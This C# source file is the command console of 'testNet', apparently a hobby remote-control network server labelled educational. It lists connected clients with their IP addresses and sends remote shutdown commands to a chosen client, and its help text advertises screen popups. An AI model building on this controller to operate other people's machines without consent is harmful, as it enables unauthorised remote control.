using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using testNet_v3.Util;

namespace testNet_v3
{
    class command
    {
        private static Queue<String> queueInput = new Queue<String>();

        public static void CommandHandler()
        {
            Logger.Log(Logger.LogType.INFO, "Started CommandHandler");

            while (true)
            {
                if(queueInput.Count > 0)
                {
                    string s = queueInput.Dequeue();
                    switch(s)
                    {
                        case string a when a.Contains("help"):
                            Logger.Log(Logger.LogType.INFO, "Help Command Executed");
                            cmdHelp();
                            break;

                        case string a when a.Contains("credits"):
                            Logger.Log(Logger.LogType.INFO, "Credits Command Executed");
                            cmdCredits();
                            break;

                        case string a when a.Contains("clients"):
                            Logger.Log(Logger.LogType.INFO, "Clients Command Executed");
                            cmdClients();
                            break;

                        case string a when a.Contains("shutdown"):
                            Logger.Log(Logger.LogType.INFO, "Clients Command Executed");
                            string[] ss = ParseArgs(s);
                            try
                            {
                                cmdShutdown(ss[1], ss[2], ss[3]);
                            } catch
                            {
                                Console.WriteLine("Insufficient args");
                            }
                            break;

                        default:
                            Console.WriteLine("Command not recognized, use " + netCfg.prefix + "help for help!");
                            break;
                    }

                }
                Thread.Sleep(netCfg.refreshTimeout);
            }
        }
        public static void InputListener()
        {
            Logger.Log(Logger.LogType.INFO, "Started InputListener");
            while (true)
            {
                string s = Console.ReadLine();
                if (s != "")
                {
                    if(s.Contains(netCfg.prefix)) 
                    {
                        queueInput.Enqueue(s);
                    }
                }

            }
        }

        public static void DisplayLogo()
        {
            Console.Clear();
            Console.WriteLine(@"
  __                   __   _______          __   
_/  |_  ____   _______/  |_ \      \   _____/  |_ 
\   __\/ __ \ /  ___/\   __\/   |   \_/ __ \   __\
 |  | \  ___/ \___ \  |  | /    |    \  ___/|  |  
 |__|  \___  >____  > |__| \____|__  /\___  >__|  
           \/     \/               \/     \/      
- testNet " + netCfg.version + @"
- Made with love <3, from the powerhouse of the cell!
- Use " + netCfg.prefix + @"help for a list of commands.
- For educational purposes only!");
            
        }
        private static string[] ParseArgs(string s)
        {
            try
            {
                return s.Split(' ');
            } catch
            {
                return null;
            }
        }
        private static void cmdHelp()
        {
            DisplayLogo();
            Console.WriteLine(Environment.NewLine + "Help:");
            string s =
                @"
Prefix: " + Util.netCfg.prefix + @"
General Commands:
help - Displays this screen
credits - Displays the credits
clients - Displays all clients

Client Commands:
shutdown <client id> <reason> <time> - Shuts down a client
popup <body> <title> - Creates a messagebox on the client's screen
                ";
            Console.WriteLine(s);
            
        }

        private static void cmdCredits()
        {
            DisplayLogo();
            Console.WriteLine(Environment.NewLine + "Credits:");
            Console.WriteLine(@"
testNet was written by mito#8093 to test his abilities. testNet is not intended to be deployed.
https://github.com/Caiusiscool
");
        }

        private static void cmdClients()
        {
            DisplayLogo();
            Console.WriteLine(Environment.NewLine + "Clients:");
            if(Client.clients.Count > 0) {
                foreach (Client c in Client.clients)
                {
                    
                    try {
                        c.Write("alive-check");
                        c.Write("alive-check");
                    } catch { }
                    Console.WriteLine("Id: " + c.id + "| Name: " + c.name + " | Ip: " + c.ip + " | Connected: " + c.conn.Connected);
                }
            } else
            {
                Console.WriteLine("There are no current clients!");
            }

        }

        private static void cmdShutdown(string client_id, string reason, string time)
        {
            foreach(Client c in Client.clients)
            {
                if(client_id == c.id.ToString())
                {
                    c.Write("[shutdown] (" + reason + ") {" + time + "}");
                }
            }
        }
    }
}
